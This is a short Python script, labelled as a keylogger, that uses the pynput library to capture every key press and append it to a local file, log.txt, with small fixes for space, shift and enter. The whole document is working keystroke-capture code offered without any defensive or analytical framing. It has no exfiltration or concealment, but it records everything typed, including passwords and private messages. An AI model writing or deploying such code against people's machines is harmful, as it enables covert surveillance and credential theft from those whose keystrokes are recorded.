
##! KeyLogger 
##* storing keystrokes in a text file

##? Libraries used:
# pynput for listen/controll i/o
from pynput.keyboard import Listener

def storeToFile(key):
    letter = str(key)
    letter = letter.replace("'","")
    
    # Handle some of Key code
    if letter == "Key.space":
        letter = ' '
    if letter == "Key.shift":
        letter = ''
    if letter ==  "Key.enter":
        letter = '\n'

    with open("log.txt", "a") as file:
        file.write(letter)

with Listener(on_press=storeToFile) as l:
    l.join()    # make sure that our keystrokes are joined together (meaning add '')